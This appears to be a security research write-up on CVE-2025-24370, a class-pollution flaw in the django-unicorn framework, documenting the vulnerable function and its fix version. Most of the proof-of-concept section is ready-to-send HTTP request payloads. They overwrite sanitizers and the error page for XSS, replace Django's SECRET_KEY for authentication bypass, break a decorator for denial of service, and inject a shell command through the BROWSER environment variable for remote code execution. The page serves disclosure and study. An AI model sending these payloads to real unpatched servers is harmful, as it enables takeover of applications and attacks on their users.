---
title: "django-unicorn"
weight: 1
---

# django-unicorn (CVE-2025-24370)

**django-unicorn** is a reactive component framework for Django (2.4K stars) that synchronizes client-side state with server-side Python objects over HTTP messages.

| Field | Value |
|-------|-------|
| Repository | [adamghill/django-unicorn](https://github.com/adamghill/django-unicorn) |
| Version | 0.61.0 |
| CVE | [CVE-2025-24370](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43) |
| Type | Agnostic-Get × Dual-Set |
| Input | Remote (HTTP POST) |
| Consequences | RCE, XSS, DoS, Authentication Bypass |
| Status | Fixed in 0.62.0 |

## Summary

Django-Unicorn is vulnerable to a class pollution vulnerability arising from its core `set_property_value` function, which can be remotely triggered by users by crafting appropriate component requests. The vulnerability allows arbitrary changes to the Python runtime status, leading to Cross-Site Scripting (XSS), Denial of Service (DoS), Authentication Bypass, and Remote Code Execution in virtually every Django-Unicorn-based application.

## Vulnerability

The sink is `set_property_value` in `django_unicorn/views/action_parsers/utils.py`. It receives a dotted `property_name` directly from the JSON body of a component request:

[`django_unicorn/views/action_parsers/utils.py`](https://github.com/adamghill/django-unicorn/blob/7dcb01009c3c4653b24e0fb06c7bc0f9d521cbb0/django_unicorn/views/action_parsers/utils.py#L10):

```python
def set_property_value(component, property_name, property_value) -> None:
    ...
    property_name_parts = property_name.split(".")
    component_or_field = component
    ...
    for idx, property_name_part in enumerate(property_name_parts):
        if hasattr(component_or_field, property_name_part):
            if idx == len(property_name_parts) - 1:
                ...
                setattr(component_or_field, property_name_part, property_value)
                ...
            else:
                component_or_field = getattr(component_or_field, property_name_part)
                ...
        elif isinstance(component_or_field, dict):
            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part] = property_value
                ...
            else:
                component_or_field = component_or_field[property_name_part]
                ...
        elif isinstance(component_or_field, (QuerySet, list)):
            property_name_part_int = int(property_name_part)
            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part_int] = property_value
                ...
            else:
                component_or_field = component_or_field[property_name_part_int]
                ...
        else:
            break
```

The function performs both `getattr` and `__getitem__` for resolution (Agnostic-Get) and both `setattr` and `__setitem__` for the final write (Dual-Set). There is no check for dunder-prefixed path segments.

This functionality is triggered via component requests by specifying the request type as `syncInput`:

```
POST /unicorn/message/COMPONENT_NAME

{
    "id": 123,
    "actionQueue": [
        {
            "type": "syncInput",
            "payload": {
                "name": "DOTTED_PATH",
                "value": "ASSIGNED_VALUE"
            }
        }
    ],
    "data": {...},
    "epoch": "123",
    "checksum": "XXXX"
}
```

By setting `property_name` to a path like `__init__.__globals__`, the component context changes to the global context of the component module, allowing modification of any global objects including variables, instances, classes, and functions of any module in the dependency chain.

## PoC

### Consequence 1: Reflected XSS (bs4 HTML Sanitizer Overwrite)

Django-Unicorn uses the `EntitySubstitution` rule from BeautifulSoup to sanitize HTML in template responses. This rule is stored in a global dictionary that can be polluted.

```
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<",
        "value": "<img/src=1 onerror=alert('bs4_html_entity_bypass')>"
      }
    }
  ],
  "data": {"task": "", "tasks": []},
  "epoch": "123",
  "checksum": "XXX"
}
```

**Effect**: The sanitizer's `<` entity value is replaced with an XSS payload. Whenever a template response renders a `<` in cleartext, it is converted to the payload, leading to reflected XSS for all users.

---

### Consequence 2: Stored XSS (Django JSON Script Sanitizer Bypass)

Django-Unicorn always includes a script tag in the webpage where a `NAME` value is dynamically extracted from the `MORPHER_NAMES` and `DEFAULT_MORPHER_NAME` variables in the settings module. Django by default escapes special characters into unicode sequences via the `_json_script_escapes` variable. By clearing this sanitizer and polluting the settings, we achieve stored XSS.

```
POST /unicorn/message/todo HTTP/1.1

{
  "id": "3gpDSUcxzs1",
  "data": {"task": "", "tasks": []},
  "checksum": "XXX",
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.MORPHER_NAMES",
        "value": ["</script><script>alert('xss')</script>"]
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django_unicorn.settings.DEFAULT_MORPHER_NAME",
        "value": "</script><script>alert('xss')</script>"
      }
    },
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.utils.html._json_script_escapes",
        "value": {}
      }
    }
  ],
  "epoch": 1737318956605,
  "hash": "jWGuTFzy"
}
```

**Effect**: The attacker's script is injected into all pages served to all users. This is a universal stored XSS that persists for the lifetime of the process.

---

### Consequence 3: Stored XSS (Django Error Page Overwrite)

Django stores its error page source code in the global variable `ERROR_PAGE_TEMPLATE` at `django/views/defaults.py`. By polluting this variable, any user triggering an error (e.g., accessing a nonexistent resource) will execute the attacker's payload.

```
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.views.defaults.ERROR_PAGE_TEMPLATE",
        "value": "<html><script>alert('error page pollution')</script></html>"
      }
    }
  ],
  "data": {"task": "", "tasks": []},
  "epoch": "123",
  "checksum": "XXX"
}
```

**Effect**: All Django error pages (404, 500, etc.) now serve the attacker's script to every user.

---

### Consequence 4: Authentication Bypass (SECRET_KEY Overwrite)

Django's `SECRET_KEY` is used to sign and verify session cookies and other security mechanisms. By polluting its runtime value, an attacker can forge session cookies to log in as any user.

```
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY",
        "value": "test"
      }
    }
  ],
  "data": {"task": "", "tasks": []},
  "epoch": "123",
  "checksum": "XXX"
}
```

**Effect**: The attacker now knows the signing secret used for session cookies, CSRF tokens, and password reset links. They can forge a session cookie for any user (including superusers) offline.

---

### Consequence 5: DoS (Decorator Overwrite)

The `timed` decorator is used to wrap many important functions in django-unicorn, such as `_call_method_name`. By polluting it to a string, all decorated function calls become uncallable.

```
POST /unicorn/message/todo HTTP/1.1

{
  "id": 123,
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.timed",
        "value": "X"
      }
    }
  ],
  "data": {"task": "", "tasks": []},
  "epoch": "123",
  "checksum": "XXX"
}
```

**Effect**: The backend crashes on any subsequent function call that uses the `timed` decorator, resulting in complete denial of service.

---

### Consequence 6: RCE (location_cache + BROWSER Environment Variable)

By polluting the `location_cache` object, attackers achieve arbitrary module importation. Combined with polluting the `BROWSER` OS environment variable, this leads to remote code execution when the `antigravity` module is imported (which calls `webbrowser.open()`, which reads `BROWSER` and executes it).

**Step 1**: Pollute `location_cache` to trigger `antigravity` module import on next request:

```
POST /unicorn/message/todo HTTP/1.1

{
  "id": "E5FBWqME",
  "data": {"task": "", "tasks": []},
  "checksum": "XvvsDQXX",
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.location_cache._Cache__data.todo",
        "value": ["antigravity", "any"]
      }
    },
    {
      "type": "callMethod",
      "payload": {"name": "add"}
    }
  ],
  "epoch": 1746680343776,
  "hash": "CG5pMDxc"
}
```

**Step 2**: Pollute `BROWSER` environment variable with the command injection payload:

```
POST /unicorn/message/todo HTTP/1.1

{
  "id": "E5FBWqME",
  "data": {"task": "", "tasks": []},
  "checksum": "XvvsDQXX",
  "actionQueue": [
    {
      "type": "syncInput",
      "payload": {
        "name": "__init__.__globals__.sys.modules.os.environ",
        "value": {"BROWSER": "/bin/sh -c \"touch /tmp/pwned\" #%s"}
      }
    },
    {
      "type": "callMethod",
      "payload": {"name": "add"}
    }
  ],
  "epoch": 1746680343776,
  "hash": "CG5pMDxc"
}
```

**Effect**: Arbitrary shell command execution as the Django process user.

## Impact

Django-Unicorn is widely used as a reactive component framework. Any remote user of a django-unicorn application can exploit this vulnerability to achieve XSS, DoS, authentication bypass, and RCE. The component request endpoint is accessible to any authenticated user, making this a remote-triggerable vulnerability with critical severity.

## Proof of Concept

[`cp-collection/django-unicorn/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/django-unicorn/poc)
&mdash; runnable exploit environment with `run.sh` and `requirements.txt`.
